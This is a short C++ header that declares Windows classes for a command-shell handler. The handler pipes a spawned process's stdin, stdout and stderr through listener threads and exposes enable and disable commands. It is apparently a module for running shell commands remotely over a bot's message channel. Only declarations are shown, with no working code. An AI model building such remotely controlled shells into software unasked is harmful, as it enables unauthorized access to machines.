

#ifndef __CMDSHELL_H__
#define __CMDSHELL_H__

#ifdef _WIN32

class CStdOut_Listen : public CThread
{
public:
				 CStdOut_Listen();
	virtual		~CStdOut_Listen();

	void		*Run();

	CMessage	*m_pMessage;
	HANDLE		 m_hStdOut;
};

class CCmdShell : public CCommandHandler
{
public:
					 CCmdShell();
	virtual			~CCmdShell();

	void			 Init();

	bool			 HandleCommand(CMessage *pMsg);

	command			 m_cmdFallBackHandler,
					 m_cmdEnable,
					 m_cmdDisable;

	bool			 m_bEnabled;

	HANDLE			 m_hStdIn;
	HANDLE			 m_hStdOut;
	HANDLE			 m_hStdErr;

	HANDLE			 m_hProcess;

	STARTUPINFO		 m_sinfo;

	CMessage		 m_mMessage;

	CStdOut_Listen	*m_pStdOut;
	CStdOut_Listen	*m_pStdErr;
};

#endif // _WIN32

#endif // __CMDSHELL_H__
